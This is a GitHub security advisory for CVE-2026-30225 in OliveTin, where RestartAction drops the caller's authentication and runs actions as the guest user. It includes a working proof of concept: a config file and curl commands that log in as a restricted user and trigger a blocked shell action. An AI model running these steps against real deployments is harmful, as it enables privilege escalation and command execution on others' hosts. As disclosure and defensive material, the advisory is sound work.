# [M] OliveTin's RestartAction always runs actions as guest

## Summary
Severity: Medium
Advisory: GHSA-p443-p7w5-2f7f
CVE: CVE-2026-30225
CWE: CWE-250, CWE-441
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-03-05
Source: https://github.com/advisories/GHSA-p443-p7w5-2f7f
Type: github-advisory

## Affected
- Go: `github.com/OliveTin/OliveTin` — affected >=0 <0.0.0-20260305000458-cb46a597b246

## Details
### Summary
An authentication context confusion vulnerability in RestartAction allows a low‑privileged authenticated user to execute actions they are not permitted to run.

RestartAction constructs a new internal connect.Request without preserving the original caller’s authentication headers or cookies. When this synthetic request is passed to StartAction, the authentication resolver falls back to the guest user. If the guest account has broader permissions than the authenticated caller, this results in privilege escalation and unauthorized command execution.

This vulnerability allows a low‑privileged authenticated user to bypass ACL restrictions and execute arbitrary configured shell actions.

### Details
Affected files:

service/internal/api/api.go

service/internal/auth/authcheck.go

Relevant code in RestartAction:

```
return api.StartAction(ctx, &connect.Request[apiv1.StartActionRequest]{
    Msg: &apiv1.StartActionRequest{
        BindingId:        execReqLogEntry.GetBindingId(),
        UniqueTrackingId: req.Msg.ExecutionTrackingId,
    },
})
```
Authentication in StartAction:
```
authenticatedUser := auth.UserFromApiCall(ctx, req, api.cfg)
```
Issue:

1. RestartAction creates a new connect.Request object.

2. The new request does not preserve caller headers or cookies.

3. UserFromApiCall() attempts to resolve the user from the request.

4. Because authentication headers are missing, it falls back to the guest user.

5. If guest.exec = true while the original caller has exec = false, the action executes with elevated privileges.

### PoC

Configuration:
```
defaultPermissions:
  exec: false

users:
  - username: low
    password: lowpass
    permissions:
      exec: false

  - username: guest
    permissions:
      exec: true

actions:
  - id: restart_bypass_action
    shell: |
      echo "pwned" > /tmp/olivetin_restart_bypass.txt
```

Steps to reproduce:

Login as low user
```
LOW_LOGIN=$(curl -sS -i -X POST \
  http://localhost:1337/olivetin.api.v1.OliveTinApiService/LocalUserLogin \
  -H 'Content-Type: application/json' \
  -d '{"username":"low","password":"lowpass"}')

LOW_SID=$(printf '%s\n' "$LOW_LOGIN" | tr -d '\r' | \
  awk -F'[=;]' '/^Set-Cookie: olivetin-sid-local=/{print $2; exit}')
```
Attempt direct execution (correctly blocked)
```
LOW_RUN=$(curl -sS -X POST \
  http://localhost:1337/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
  -H 'Content-Type: application/json' \
  -H "Cookie: olivetin-sid-local=$LOW_SID" \
  -d '{"actionId":"restart_bypass_action"}')

echo "$LOW_RUN"
```
This should return permission denied.

Extract executionTrackingId from response:
```
TRACKING_ID=$(printf '%s' "$LOW_RUN" | \
  sed -n 's/.*"executionTrackingId":"\([^"]*\)".*/\1/p' | head -n1)

echo "Tracking ID: $TRACKING_ID"
```
Call RestartAction:
```
curl -sS -X POST \
  http://localhost:1337/olivetin.api.v1.OliveTinApiService/RestartAction \
  -H 'Content-Type: application/json' \
  -H "Cookie: olivetin-sid-local=$LOW_SID" \
  -d "{\"executionTrackingId\":\"$TRACKING_ID\"}"
```
Verify command executed:
```
cat /tmp/olivetin_restart_bypass.txt
```
Output:
```
pwned
```

### Impact
- Privilege Escalation
- ACL Bypass
- Unauthorized Command Execution

Any authenticated low-privilege user can execute actions they are not authorized to run if:
- Guest has broader permissions
- RestartAction is enabled
Because OliveTin actions execute system shell commands, this can lead to:
- Arbitrary file writes
- Sensitive data exposure
- Potential full host compromise (depending on OliveTin runtime privileges)

This affects all deployments where:
- guest.exec = true
- A restricted user has exec = false
- RestartAction endpoint is accessible

## References
- https://github.com/OliveTin/OliveTin/security/advisories/GHSA-p443-p7w5-2f7f
- https://nvd.nist.gov/vuln/detail/CVE-2026-30225
- https://github.com/OliveTin/OliveTin/commit/cb46a597b2465235839ed58cf034b5e7b70ef911
- https://github.com/OliveTin/OliveTin
- https://github.com/OliveTin/OliveTin/releases/tag/3000.11.1
